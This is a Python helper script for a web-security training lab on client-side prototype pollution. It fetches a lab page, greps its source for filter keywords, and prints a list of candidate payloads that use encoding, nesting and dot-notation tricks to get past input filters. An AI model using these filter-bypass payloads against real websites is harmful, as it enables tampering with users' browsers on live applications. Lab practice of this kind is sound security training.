"""
Lab 5: Bypassing flawed input filters for client-side prototype pollution
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-bypassing-flawed-input-filters
Difficulty: Practitioner

📝 A tougher filter than Lab 4 — the straightforward wrap-around bypass
doesn't work here. Cycle through a broader set of known filter-evasion
encodings for the key/path, since each lab build's filter catches
different specific patterns.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"

CANDIDATES = [
    "__proto__[test]=polluted",
    "__pro__proto__to__[test]=polluted",
    "constructor[prototype][test]=polluted",
    "constructor%5Bprototype%5D%5Btest%5D=polluted",     # URL-encoded brackets
    "__proto__.test=polluted",                            # dot instead of bracket
    "%5f%5fproto%5f%5f[test]=polluted",                   # fully URL-encoded __proto__
]


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("This filter is stricter than Lab 4's — check exactly what pattern")
    note("it's matching against (case sensitivity? bracket vs dot notation?")
    note("encoded vs literal?) before assuming any single bypass will work.")
    grep_for_patterns(source, ["__proto__", "constructor", "sanitiz", "blacklist", "filter"])

    note("Candidates to try (open each in a real browser, check")
    note("Object.prototype.test in console afterward):")
    for c in CANDIDATES:
        print(f"  {TARGET}/?{c}")


if __name__ == "__main__":
    run()
